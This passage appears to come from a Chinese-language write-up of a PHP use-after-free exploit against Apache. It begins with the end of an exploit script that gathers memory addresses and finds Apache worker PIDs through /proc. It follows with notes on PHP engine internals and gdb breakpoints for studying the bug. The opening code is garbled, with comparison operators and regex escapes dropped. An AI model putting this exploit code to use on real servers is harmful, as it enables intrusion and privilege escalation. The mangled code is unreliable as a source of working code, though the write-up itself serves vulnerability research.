    function in($i, $range)
    {
        return $i >= $range[0] && $i = 0x10000 && $msize  $a)
        {
            if(!is_array($a))
                $a = [$a];
            o('  ' . $k . ': ' . implode('-0x', array_map(function($z) {
                    return '0x' . dechex($z);
            }, $a)));
        }
        o('');
        return $addresses;
    }
    # Extracts PIDs of apache workers using /proc/*/cmdline and /proc/*/status,
    # matching the cmdline and the UID
    function get_workers_pids()
    {
        o('Obtaining apache workers PIDs');
        $pids = [];
        $cmd = file_get_contents('/proc/self/cmdline');
        $processes = glob('/proc/*');
        foreach($processes as $process)
        {
            if(!preg_match('#^/proc/([0-9]+)$#', $process, $match))
                continue;
            $pid = (int) $match[1];
            if(
                !is_readable($process . '/cmdline') ||
                !is_readable($process . '/status')
            )
                continue;
            if($cmd !== file_get_contents($process . '/cmdline'))
                continue;
            $status = file_get_contents($process . '/status');
            foreach(explode("n", $status) as $line)
            {
                if(
                    strpos($line, 'Uid:') === 0 &&
                    preg_match('#b' . posix_getuid() . 'b#', $line)
                )
                {
                    o('  Found apache worker: ' . $pid);
                    $pids[$pid] = $pid;
                    break;
                }
            }
        }
        o('Got ' . sizeof($pids) . ' PIDs.');
        o('');
        return $pids;
    }
    $addresses = get_all_addresses();
    $workers_pids = get_workers_pids();
    real();
    ?>
## 6\. 背景知识
php内核相关: 
###  函数
自定义函数执行原理  
execute_ex处理php脚本中函数的执行，它将php语言解释成OPCODE指令。  
其中无返回值函数的解释和执行在ZEND_DO_UCALL_SPEC_RETVAL_UNUSED_HANDLER中完成。  
通过VM_ENTER宏以此调用opcode对应的handler处理指令。
调用栈：
    #0  execute_ex
    #1  0x0000555555ddd43d in zend_execute 
    #2  0x0000555555c1b919 in zend_execute_scripts 
    #3  0x0000555555b60723 in php_execute_script 
    #4  0x0000555555de0cf8 in do_cli 
    #5  0x0000555555de20bf in main 
    #6  0x00007ffff6a38b97 in __libc_start_main 
    #7  0x00005555556896aa in _start ()
execute_ex函数：
    ZEND_API void execute_ex(zend_execute_data *ex)
    {
        while (1) {
    ...
                HYBRID_CASE(ZEND_DO_UCALL_SPEC_RETVAL_UNUSED):
                    ZEND_DO_UCALL_SPEC_RETVAL_UNUSED_HANDLER(ZEND_OPCODE_HANDLER_ARGS_PASSTHRU);
                    HYBRID_BREAK();
    ...
    }
ZEND_DO_UCALL_SPEC_RETVAL_UNUSED_HANDLER函数：
    static ZEND_VM_HOT ZEND_OPCODE_HANDLER_RET ZEND_FASTCALL ZEND_DO_UCALL_SPEC_RETVAL_UNUSED_HANDLER(ZEND_OPCODE_HANDLER_ARGS)
    {
        USE_OPLINE
        zend_execute_data *call = EX(call);
        zend_function *fbc = call->func;
        zval *ret;
    ...
        i_init_func_execute_data(call, &fbc->op_array, ret);
        ZEND_VM_ENTER();
    }
ZEND_VM_ENTER宏：
    # define ZEND_VM_ENTER()           execute_data = EG(current_execute_data); LOAD_OPLINE(); ZEND_VM_INTERRUPT_CHECK(); ZEND_VM_CONTINUE()
    #  define ZEND_VM_CONTINUE()     ((opcode_handler_t)OPLINE->handler)(ZEND_OPCODE_HANDLER_ARGS_PASSTHRU); return
zend_function结构体：  
保存了php函数名称，参数，opcode数组op_array
    union _zend_function {
        zend_uchar type;    
        uint32_t   quick_arg_flags;
        struct {
    ...
            zend_string *function_name;
    ...
            uint32_t num_args;
            uint32_t required_num_args;
    ...
        } common;
        zend_op_array op_array;
        zend_internal_function internal_function;
    };
zend_op_array和op_code:
    struct _zend_op_array {
        /* Common elements */
        zend_uchar type;
    ...
        zend_string *function_name;
    ...
        zend_op *opcodes;
    ...
        HashTable *static_variables;
    }
    struct _zend_op {
        const void *handler;
    ...
        zend_uchar opcode;
    ...
    };
调试：  
这样下断点可以观察到即将执行的自定义函数
    gdb
    file php
    b main
    r uaf.php
    b i_init_func_execute_data
    c
    si
    p (char *)(op_array.function_name.val)
    c
    si
    p (char *)(op_array.function_name.val)
###  类
    // A PHP object is a combination of a lot of structures, such as zval, zend_object, zend_object_handlers, zend_string, etc., which are all allocated, and freed when the object is destroyed.
    struct _zend_object {
        zend_refcounted_h gc; // 引用计数器，8字节
        uint32_t          handle; 
        zend_class_entry *ce;
        const zend_object_handlers *handlers;
        HashTable        *properties;
        zval              properties_table[1];
    };
    struct _zend_class_entry {
        char type;
        zend_string *name;
        struct _zend_class_entry *parent;
        int refcount;
        uint32_t ce_flags;
    ...
        HashTable function_table;
        HashTable properties_info;
        HashTable constants_table;
    ...
        union _zend_function *constructor;
        union _zend_function *destructor;
    ...
    }
    struct _zend_object_handlers {
        /* offset of real object header (usually zero) */
        int                                     offset;